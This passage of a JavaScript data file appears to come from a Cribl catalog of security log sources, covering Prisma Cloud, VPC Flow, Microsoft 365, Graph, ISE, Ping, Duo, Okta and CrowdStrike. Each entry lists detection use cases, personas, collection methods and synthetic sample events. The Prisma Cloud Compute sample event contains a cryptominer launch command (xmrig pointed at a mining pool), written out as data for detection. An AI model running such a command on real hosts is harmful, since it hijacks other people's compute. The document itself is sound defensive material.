            { persona: 'Platform Operator', job: 'Monitor cloud resource inventory drift and detect unauthorized infrastructure provisioning across 500+ accounts within 15 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track IAM permission sprawl trends by identifying service accounts with unused privileges exceeding 90-day inactivity thresholds' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Prisma Cloud Alert API (Cribl REST Collector polling) / Webhook Integration (HTTPS POST) / Amazon SQS / Splunk Integration',
        logFormat: 'JSON alert objects. Key fields: alertId, status, policy.name, policy.severity, policy.complianceMetadata, resource.cloudType, resource.resourceType, resource.name, resource.region, resource.account, riskDetail, remediationCli.',
        avgEPS: '500-10,000 EPS depending on cloud footprint and policy count',
        sampleEvent: '{"id":"A-12345678","status":"open","alertTime":"2026-06-06T14:32:08Z","policy":{"policyId":"pol-abc123","name":"S3 Bucket is publicly accessible","severity":"high","policyType":"config","complianceMetadata":[{"standardName":"CIS AWS Benchmark","requirementId":"2.1.5"}]},"resource":{"rrn":"rrn:aws:s3:us-east-1:123456789012:bucket/sensitive-data-bucket","cloudType":"aws","resourceType":"aws_s3_bucket","name":"sensitive-data-bucket","region":"us-east-1","account":"Production (123456789012)"},"riskDetail":{"riskScore":85,"reason":"Bucket allows public read access and contains sensitive data patterns"},"alertRules":[{"name":"Production Critical Assets"}]}'
      },
      {
        id: 'prisma-cloud-cwp',
        name: 'Prisma Cloud Compute (CWP) Runtime Events',
        vendor: 'Palo Alto Networks',
        description: 'Cloud Workload Protection (CWP) runtime security events from Prisma Cloud Compute (formerly Twistlock). Captures container runtime anomalies, host security events, vulnerability scan results, compliance check outcomes, web application firewall (WAAS) events, and serverless function alerts. Defenders report process execution, network connections, file system changes, and image vulnerability assessments.',
        status: 'available',
        useCases: ['Container Escape Detection', 'Cryptominer Detection', 'Runtime Process Anomalies', 'Vulnerability Prioritization', 'Image Compliance', 'Kubernetes Admission Control', 'Serverless Injection', 'WAAS Attack Blocking', 'Host Integrity Monitoring'],
        personas: ['Cloud Security', 'Security Engineering', 'Platform Engineering', 'DevOps', 'SOC', 'Container Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for container escape attempts, cryptominer execution, and runtime process anomalies with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Investigate container runtime alerts by correlating process execution with image vulnerability data and Kubernetes admission decisions' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement within Kubernetes clusters by identifying unexpected network connections between namespaces and pods' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Defender agent health across container fleet and detect coverage gaps exceeding 5% of running workloads within 10 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track vulnerability scan results by severity and image to prioritize patching efforts for critical CVEs in production namespaces' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine vulnerability scan results and compliance check passes, reducing CWP event volume by 50-65% for SIEM destinations' },
            { persona: 'Data Engineer', job: 'Route runtime security alerts and incidents to SIEM while sending vulnerability and compliance data to Lake for trend reporting' },
            { persona: 'Team Leader', job: 'Quantify container security log optimization savings by comparing per-cluster ingestion costs before and after Cribl routing' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale CWP event collection to handle 200+ clusters with zero event loss during deployment surges and auto-scaling events' },
            { persona: 'Data Onboarder', job: 'Deploy Prisma Cloud Compute API collection with webhook failover and deduplication across multi-region deployments within 1 hour' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Prisma Cloud Compute API (Cribl REST Collector) / Webhook Alerts / Syslog (CEF) / Cortex XSIAM integration',
        logFormat: 'JSON. Types: runtime audit (process/network/filesystem), vulnerability scan, compliance check, WAAS event, incident. Key fields: type, hostname, imageName, containerName, namespace, cluster, rule, effect, msg, forensics.',
        avgEPS: '2,000-50,000 EPS depending on container fleet size and defender count',
        sampleEvent: '{"type":"containerRuntime","time":"2026-06-06T14:32:08Z","hostname":"k8s-worker-03","imageName":"registry.example.com/api-service:v2.1.4","containerName":"api-service-7b4f8c6d9-xk2mz","namespace":"production","cluster":"prod-east-1","rule":"Default - alert on suspicious processes","effect":"alert","msg":"Unexpected process launched: /tmp/xmrig","processPath":"/tmp/xmrig","processMD5":"a1b2c3d4e5f6789012345678","user":"root","pid":4521,"interactive":false,"forensics":{"command":"./xmrig -o pool.mining.com:3333 -u wallet123","parentProcess":"/bin/sh","parentPid":4520}}'
      },
      {
        id: 'aws-vpc-flow',
        name: 'AWS VPC Flow Logs',
        vendor: 'Amazon Web Services',
        description: 'Network flow records from AWS VPCs capturing accepted and rejected traffic at the ENI level. Includes source/destination IPs, ports, protocol, action (ACCEPT/REJECT), bytes, packets, tcp-flags, and flow direction.',
        status: 'available',
        useCases: ['Lateral Movement', 'Exposed Services', 'Suspicious Egress', 'Port Scanning Detection', 'Network Troubleshooting', 'Traffic Imbalance', 'Service Dependency Mapping', 'NAT Gateway Monitoring', 'Cross-AZ Traffic Analysis'],
        personas: ['Security Engineering', 'Cloud Security', 'SRE', 'Platform Engineering', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for lateral movement, port scanning, and suspicious egress to known-bad IPs using VPC flow action fields' },
            { persona: 'Data End User / Analyst', job: 'Investigate rejected traffic patterns to identify exposed services and unauthorized access attempts across VPC boundaries' },
            { persona: 'Jack of All Trades', job: 'Detect data exfiltration by flagging outbound flows exceeding 1GB to non-approved external IPs within 15-minute windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate VPC flow logs into 5-minute summaries for accepted traffic while preserving per-flow detail for rejects, reducing volume by 70-85%' },
            { persona: 'Data Engineer', job: 'Route rejected flows and high-volume anomalies to SIEM while sending accepted flow summaries to Lake for network capacity planning' },
            { persona: 'Team Leader', job: 'Demonstrate VPC flow log cost reduction from raw S3 storage to optimized routing with maintained security detection coverage' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor cross-AZ traffic patterns and NAT gateway utilization to detect routing anomalies and optimize network architecture costs' },
            { persona: 'Data End User / Analyst', job: 'Map service dependencies using flow records to validate security group rules and identify unnecessary network exposure' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3 Collector for VPC flow log ingestion with automatic partition discovery and parsing within 30 minutes' },
            { persona: 'Platform Administrator', job: 'Scale VPC flow collection across 100+ accounts using centralized S3 delivery with cross-account IAM role federation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'S3 (VPC publishes to S3 bucket) / CloudWatch Logs / Kinesis Data Firehose',
        sampleEvent: '2 123456789012 eni-0a1b2c3d4e5f6g7h8 10.0.1.25 52.94.76.89 49152 443 6 15 12000 1717680000 1717680060 ACCEPT OK'
      },
      {
        id: 'o365-activity',
        name: 'Microsoft 365 Unified Audit Log',
        vendor: 'Microsoft',
        description: 'Microsoft 365 Unified Audit Log capturing user and admin activity across Exchange Online, SharePoint Online, OneDrive, Teams, Azure AD, Power Platform, and Microsoft Defender. Events include mailbox access, file sharing, permission changes, DLP policy matches, eDiscovery actions, and admin configuration changes delivered via the Management Activity API.',
        status: 'available',
        useCases: ['Business Email Compromise', 'Data Exfiltration via SharePoint/OneDrive', 'Mailbox Delegation Abuse', 'Insider Threat Detection', 'eDiscovery Abuse', 'OAuth App Consent Attacks', 'External Sharing Monitoring', 'Admin Role Changes', 'DLP Policy Violations', 'Teams Guest Access Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Compliance', 'Incident Response', 'Identity Team', 'Data Protection', 'M365 Administration'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for BEC indicators, mailbox delegation abuse, OAuth consent attacks, and mass file download patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate data exfiltration via SharePoint/OneDrive by correlating external sharing events with user risk scores and DLP matches' },
            { persona: 'Jack of All Trades', job: 'Detect insider threats by identifying unusual eDiscovery searches, mailbox exports, and Teams guest access from high-risk accounts' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete M365 audit trail for 13+ months across all workloads to satisfy SOC2/GDPR data handling requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate DLP policy violation reports by workload and user showing sensitive content sharing trends and remediation actions' },
            { persona: 'Team Leader', job: 'Present quarterly compliance posture showing external sharing reduction, DLP match resolution rates, and admin change governance metrics' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine Exchange mailbox sync and Teams presence events reducing M365 audit log volume by 55-70% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route security-critical operations (permission changes, external sharing, DLP) to SIEM while sending full audit trail to Lake' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Management Activity API collection via REST Collector with content type subscriptions and pagination within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize M365 audit events across workloads (Exchange, SharePoint, Teams, AzureAD) into unified schema for cross-workload correlation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Office 365 Management Activity API (Cribl REST Collector polling) / Azure Event Hub / Microsoft Graph Security API / Splunk Add-on for O365',
        logFormat: 'JSON via Management Activity API. Content types: Audit.AzureActiveDirectory, Audit.Exchange, Audit.SharePoint, Audit.General, DLP.All. Each event has Operation, UserId, ClientIP, Workload, and workload-specific extended properties.',
        avgEPS: '2,000-50,000 EPS depending on tenant size and workload activity',
        sampleEvent: '{"CreationTime":"2026-06-06T14:32:08","Id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","Operation":"FileDownloaded","OrganizationId":"12345678-abcd-ef12-3456-7890abcdef12","RecordType":6,"UserKey":"i:0h.f|membership|10032000a1b2c3d4@live.com","UserType":0,"Version":1,"Workload":"OneDrive","ClientIP":"203.0.113.42","UserId":"jperks@cribl.io","ObjectId":"https://cribl-my.sharepoint.com/personal/jperks_cribl_io/Documents/Confidential/Q3-Revenue-Forecast.xlsx","ItemType":"File","SourceFileName":"Q3-Revenue-Forecast.xlsx","SiteUrl":"https://cribl-my.sharepoint.com/personal/jperks_cribl_io/","UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","EventSource":"SharePoint"}'
      },
      {
        id: 'microsoft-graph',
        name: 'Microsoft Graph API Security & Activity',
        vendor: 'Microsoft',
        description: 'Security alerts, sign-in logs, directory audit events, and risk detections from Microsoft Graph Security API and Azure AD (Entra ID). Consolidates signals across Microsoft Defender for Endpoint, Defender for Identity, Defender for Cloud Apps, Azure AD Identity Protection, and Intune into a unified security graph. Provides correlated incidents, user risk scores, and conditional access evaluations.',
        status: 'available',
        useCases: ['Risky Sign-In Detection', 'Compromised Account Identification', 'Conditional Access Failures', 'MFA Registration Monitoring', 'App Consent Grants', 'Device Compliance Drift', 'Impossible Travel (Entra ID)', 'Privilege Escalation', 'Incident Correlation Across Defender Stack', 'Service Principal Abuse'],
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Cloud Security', 'Compliance', 'Incident Response', 'M365 Administration'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for risky sign-ins, impossible travel, service principal abuse, and conditional access bypass patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate compromised accounts by correlating Graph risk detections with sign-in anomalies and MFA registration changes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying role assignment changes paired with anomalous sign-in locations within 10-minute windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor conditional access policy effectiveness and device compliance drift rates to maintain zero trust posture across 10K+ identities' },
            { persona: 'Data End User / Analyst', job: 'Track Defender incident correlation quality and mean-time-to-detect across Microsoft security stack signals for SOC performance reporting' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete identity risk audit trail with sign-in context for regulatory access review requirements across all Entra ID tenants' },
            { persona: 'Data End User / Analyst', job: 'Generate conditional access enforcement reports showing policy gaps, exempted users, and risk acceptance decisions by department' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter low-risk sign-in events and routine directory audit noise, reducing Graph Security log volume by 50-65% for SIEM' },
            { persona: 'Data Engineer', job: 'Route high-risk alerts and incidents to SIEM in real time while batching sign-in telemetry and audit logs to Lake for investigation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Microsoft Graph Security API (Cribl REST Collector) / Azure Event Hub (streaming) / Microsoft Graph Activity Logs / Azure Monitor Diagnostic Settings',
        logFormat: 'JSON via Graph API. Entity types: alerts (v2), incidents, signInLogs, auditLogs/directoryAudits, riskDetections, servicePrincipalRiskDetections. Key fields: id, createdDateTime, severity, status, category, userPrincipalName, ipAddress, riskLevel, riskState, conditionalAccessStatus.',
        avgEPS: '1,000-50,000 EPS depending on tenant size and Defender product coverage',
        sampleEvent: '{"id":"alert-12345-abcd","createdDateTime":"2026-06-06T14:32:08Z","severity":"high","status":"new","category":"CredentialAccess","title":"Suspicious sign-in from unfamiliar location","description":"User jperks@cribl.io signed in from an IP address not recently seen for this account","userStates":[{"userPrincipalName":"jperks@cribl.io","riskScore":"85","riskLevel":"high"}],"hostStates":[],"networkConnections":[{"sourceAddress":"203.0.113.99","destinationAddress":"login.microsoftonline.com"}],"vendorInformation":{"provider":"Azure AD Identity Protection","vendor":"Microsoft"},"riskScore":85,"assignedTo":"","conditionalAccessStatus":"notApplied","ipAddress":"203.0.113.99","location":{"city":"Lagos","state":"Lagos","countryOrRegion":"NG"}}'
      }
    ]
  },
  {
    category: 'Identity',
    icon: '🔑',
    sources: [
      {
        id: 'cisco-ise',
        name: 'Cisco ISE (Identity Services Engine)',
        vendor: 'Cisco',
        description: 'Network access control and identity event logs from Cisco Identity Services Engine (ISE). Captures RADIUS authentication/authorization decisions, 802.1X wired/wireless authentication, MAB (MAC Authentication Bypass), posture assessment results, guest access events, profiling classifications, TrustSec SGT assignments, and admin audit trails. Events delivered via syslog or pxGrid context sharing.',
        status: 'available',
        useCases: ['Network Access Control', 'Unauthorized Device Detection', '802.1X Authentication Monitoring', 'Guest Access Tracking', 'Posture Compliance Enforcement', 'BYOD Visibility', 'Endpoint Profiling', 'TrustSec Policy Monitoring', 'RADIUS Health Monitoring', 'VPN Authentication'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'Identity Team', 'NOC', 'Network Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for unauthorized device connections, authentication failures from rogue endpoints, and posture non-compliance patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate 802.1X authentication anomalies by correlating ISE decisions with endpoint profiling and TrustSec SGT assignments' },
            { persona: 'Jack of All Trades', job: 'Detect BYOD policy violations by identifying unmanaged devices receiving corporate network access via MAB bypass within 5 minutes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete NAC authentication audit trail with posture evidence for 12+ months to satisfy PCI-DSS network segmentation requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate network access compliance reports showing endpoint posture pass/fail rates and remediation timelines by location' },
            { persona: 'Team Leader', job: 'Present TrustSec segmentation coverage metrics showing percentage of network traffic with SGT enforcement across all access switches' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor RADIUS server health and authentication latency to detect ISE node degradation before access failures exceed 1% threshold' },
            { persona: 'Data End User / Analyst', job: 'Track endpoint profiling accuracy and guest access usage patterns to optimize NAC policy rules and reduce help desk tickets by 30%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter periodic RADIUS accounting updates and keepalive events, reducing ISE log volume by 45-60% while preserving all auth decisions' },
            { persona: 'Data Engineer', job: 'Route authentication failures and posture violations to SIEM while sending successful auth events to Lake for trend analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (TCP/UDP from ISE MnT nodes) / pxGrid (HTTPS pub/sub for real-time context) / ISE REST API / Cisco DNA Center integration',
        logFormat: 'Cisco ISE syslog with CSV-structured attribute-value pairs. Key message codes: 5200 (auth success), 5400 (auth failure), 5440 (endpoint profiled), 3000-3999 (posture), 60000+ (admin audit). Fields: UserName, CallingStationID (MAC), FramedIPAddress, NAS-IP, NetworkDeviceName, AuthorizationPolicyMatchedRule, PostureStatus, EndpointProfile, SGT.',
        avgEPS: '2,000-50,000 EPS depending on device count and auth frequency',
        sampleEvent: 'Jun 06 14:32:08 ISE-PSN-01 CISE_Passed_Authentications 0000012345 1 0 2026-06-06 14:32:08.123 +00:00 0012345678 5200 NOTICE Passed-Authentication: Authentication succeeded, ConfigVersionId=145, Device IP Address=10.0.1.1, DestinationIPAddress=10.0.1.50, DestinationPort=1812, UserName=jperks@cribl.io, Protocol=Radius, RequestLatency=35, NetworkDeviceName=SW-ACCESS-01, Type=Authentication, AuthenticationIdentityStore=ActiveDirectory, AuthorizationPolicyMatchedRule=Corp-Wired-FullAccess, SelectedAccessService=Default Network Access, SelectedAuthorizationProfiles=PermitAccess, PostureStatus=Compliant, EndPointMACAddress=00:1A:2B:3C:4D:5E, EndPointMatchedProfile=Windows10-Workstation, ISEPolicySetName=Wired-Dot1X, FramedIPAddress=10.1.2.100, SGT=Corp-Users(15), Location=Building-A/Floor-2/IDF-2A'
      },
      {
        id: 'ping-identity',
        name: 'Ping Identity / PingOne Logs',
        vendor: 'Ping Identity',
        description: 'Authentication, authorization, and directory event logs from PingOne, PingFederate, and PingAccess. Captures SSO transactions, adaptive MFA challenges, session management, token issuance, API gateway policy decisions, and admin configuration changes in structured JSON format.',
        status: 'available',
        useCases: ['Impossible Travel Detection', 'MFA Bypass Attempts', 'Token Replay Attacks', 'Session Hijacking', 'OAuth Abuse', 'Federated Auth Failures', 'SSO Outage Monitoring', 'Auth Latency Tracking', 'Policy Change Auditing', 'License Usage Monitoring'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for impossible travel, MFA bypass attempts, token replay attacks, and OAuth abuse patterns across federated SSO' },
            { persona: 'Data End User / Analyst', job: 'Investigate session hijacking indicators by correlating authentication events with IP geolocation shifts and device fingerprint changes' },
            { persona: 'Jack of All Trades', job: 'Detect credential compromise by identifying authentication failures followed by successful logins from different geographic regions within 30 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SSO authentication latency p95/p99 and federation endpoint health to detect PingFederate degradation within 2-minute windows' },
            { persona: 'Data End User / Analyst', job: 'Track MFA challenge success rates and adaptive authentication risk score distributions to optimize policy thresholds' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete SSO authentication audit trail with MFA evidence for 13+ months to satisfy SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate federated authentication reports showing policy change history, admin actions, and license utilization by application' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive session refresh and token validation events, reducing Ping Identity log volume by 50-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures and high-risk events to SIEM while sending successful SSO transactions to Lake for capacity planning' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'PingOne Webhook (HTTPS POST to Cribl HTTP source) / PingFederate Audit Log API / S3 Export / Syslog (CEF)',
        sampleEvent: '{"id":"evt-a1b2c3d4","recordedAt":"2026-06-06T14:32:08.000Z","action":{"type":"USER.LOGIN","description":"User authentication"},"actors":{"user":{"id":"usr-123","name":"jperks@cribl.io","type":"USER"}},"resources":[{"id":"app-456","name":"Salesforce","type":"APPLICATION"}],"result":{"status":"SUCCESS","description":"Authentication successful"},"riskLevel":"LOW","riskScore":15,"authenticationMethod":"MFA_PUSH","ipAddress":"203.0.113.42","userAgent":"Mozilla/5.0","geolocation":{"city":"Austin","state":"Texas","country":"US","latitude":30.2672,"longitude":-97.7431}}'
      },
      {
        id: 'duo-mfa',
        name: 'Duo Security Logs',
        vendor: 'Cisco (Duo)',
        description: 'Multi-factor authentication event logs from Duo Security including authentication attempts, push notifications, phone call verifications, hardware token usage, bypass codes, admin actions, and telephony events. Accessed via the Duo Admin API or Duo Trust Monitor.',
        status: 'available',
        useCases: ['MFA Fatigue/Push Spam Detection', 'Denied Auth Monitoring', 'Bypass Code Usage', 'Impossible Travel', 'New Device Enrollment', 'Auth Method Downgrade', 'Admin Abuse Detection', 'MFA Coverage Gap Reporting', 'Auth Latency Monitoring', 'Telephony Fraud Detection'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Compliance', 'Incident Response', 'Help Desk'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for MFA fatigue/push spam (5+ denied pushes in 60s), bypass code usage, and auth method downgrade attacks' },
            { persona: 'Data End User / Analyst', job: 'Investigate MFA denial clusters by correlating push spam patterns with source IP reputation and device enrollment anomalies' },
            { persona: 'Jack of All Trades', job: 'Detect impossible travel by identifying MFA approvals from geographically distant locations within physiologically impossible timeframes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete MFA authentication audit trail with device context for 12+ months to satisfy SOC2 multi-factor authentication requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate MFA coverage gap reports showing applications and users without enforced second-factor authentication by department' },
            { persona: 'Team Leader', job: 'Present MFA adoption metrics showing enrollment completion rates, auth method distribution, and telephony fraud reduction quarter-over-quarter' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Duo push delivery latency and telephony callback success rates to detect authentication infrastructure issues within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track new device enrollment patterns and auth method preferences to optimize MFA user experience and reduce help desk escalations by 25%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful authentication events for low-risk applications and deduplicate telephony events, reducing Duo log volume by 40-55%' },
            { persona: 'Data Engineer', job: 'Route denied authentications and Trust Monitor alerts to SIEM while sending successful auth telemetry to Lake for trend analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Duo Admin API (Polling via Cribl REST Collector) / Duo Trust Monitor Webhook / SIEM Connector',
        sampleEvent: '{"timestamp":1717680008,"device":"555-123-4567","factor":"duo_push","integration":"VPN Gateway","ip":"203.0.113.42","location":{"city":"Austin","state":"Texas","country":"United States"},"new_enrollment":false,"reason":"user_approved","result":"success","txid":"tx-abc123","user":{"name":"jperks@cribl.io","key":"DUSR1234567890"},"access_device":{"os":"Windows 10","browser":"Chrome 125.0","is_encryption_enabled":true,"is_firewall_enabled":true},"application":{"name":"Corporate VPN","key":"DAPP1234567890"},"auth_device":{"name":"iPhone 15","os":"iOS 18.1"},"email":"jperks@cribl.io","event_type":"authentication","isotimestamp":"2026-06-06T14:32:08+00:00"}'
      },
      {
        id: 'okta-system-logs',
        name: 'Okta System Logs',
        vendor: 'Okta',
        description: 'Identity platform event logs capturing authentication, authorization, MFA challenges, admin actions, application access, and policy changes via the Okta System Log API. Events follow a structured JSON format with actor, target, client, and outcome objects.',
        status: 'available',
        useCases: ['Impossible Travel', 'MFA Fatigue Detection', 'Credential Stuffing', 'Suspicious Logins', 'Privilege Escalation', 'Auth Failures', 'SSO Outages', 'Application Access Issues', 'Account Lockout Monitoring', 'Policy Change Tracking'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for MFA fatigue attacks, credential stuffing, impossible travel, and suspicious app consent grants with <3 min alerting' },
            { persona: 'Data End User / Analyst', job: 'Investigate account compromise by correlating failed authentication sequences with subsequent successful logins from new locations or devices' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying admin role assignments paired with policy changes from recently compromised accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Okta org health including API rate limits, SSO latency, and authentication success rates to maintain 99.9% IdP availability' },
            { persona: 'Data End User / Analyst', job: 'Track application access patterns and account lockout trends to identify integration issues and reduce authentication-related support tickets by 30%' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Okta authentication and admin audit trail for 13+ months with tamper-proof storage for regulatory compliance' },
            { persona: 'Data End User / Analyst', job: 'Generate identity governance reports showing policy changes, admin actions, and application assignment modifications by timeframe and actor' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume system.push events and token refresh operations, reducing Okta log volume by 45-60% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures, policy changes, and admin events to SIEM while sending successful auth events to Lake for usage analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Okta System Log API (Polling) / Okta Log Streaming (AWS EventBridge) / Cribl HTTP Collector (Webhook)',
        sampleEvent: '{"actor":{"id":"00u1a2b3c4d5e6f7g8","type":"User","alternateId":"jperks@cribl.io","displayName":"Jordan Perks"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","os":"Windows 10","browser":"CHROME"},"zone":"null","device":"Computer","id":null,"ipAddress":"203.0.113.42","geographicalContext":{"city":"Austin","state":"Texas","country":"United States","geolocation":{"lat":30.2672,"lon":-97.7431}}},"authenticationContext":{"authenticationStep":0,"externalSessionId":"idx1a2b3c4d5"},"displayMessage":"User login to Okta","eventType":"user.session.start","outcome":{"result":"SUCCESS"},"published":"2026-06-06T14:32:01.123Z","severity":"INFO","debugContext":{"debugData":{"requestUri":"/api/v1/authn","dtHash":"abc123","requestId":"req-id-xyz"}},"legacyEventType":"core.user_auth.login_success","transaction":{"type":"WEB","id":"txn-abc-123"},"uuid":"evt-a1b2c3d4-e5f6-7890-abcd-ef1234567890","version":"0","request":{"ipChain":[{"ip":"203.0.113.42","geographicalContext":{"city":"Austin","state":"Texas","country":"United States"}}]},"target":[{"id":"00u1a2b3c4d5e6f7g8","type":"User","alternateId":"jperks@cribl.io","displayName":"Jordan Perks"}]}'
      }
    ]
  },
  {
    category: 'Endpoint',
    icon: '💻',
    sources: [
      {
        id: 'crowdstrike-edr',
        name: 'CrowdStrike Falcon EDR',
        vendor: 'CrowdStrike',
        description: 'Endpoint detection and response telemetry from CrowdStrike Falcon sensors including process execution (ProcessRollup2), network connections, DNS requests, file writes, user logon events, and detection alerts via the Streaming API or Falcon Data Replicator (FDR).',
        status: 'available',
        useCases: ['LOLBin Detection', 'Process Injection', 'Lateral Movement', 'Credential Dumping', 'Persistence Mechanisms', 'Data Staging', 'Endpoint Health Monitoring', 'Software Inventory', 'Agent Coverage Gaps'],
        personas: ['Security Engineering', 'SOC', 'Endpoint Team', 'Threat Hunting', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for LOLBin execution, process injection, credential dumping, and persistence mechanisms with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for lateral movement by correlating ProcessRollup2 events with network connections to identify compromised credentials traversing the network' },
            { persona: 'Jack of All Trades', job: 'Detect data staging and exfiltration by identifying archive tool execution followed by large outbound transfers within 30-minute windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume FDR event types (ImageHash, DNS lookups for known-good domains) reducing EDR telemetry by 55-70% for SIEM delivery' },
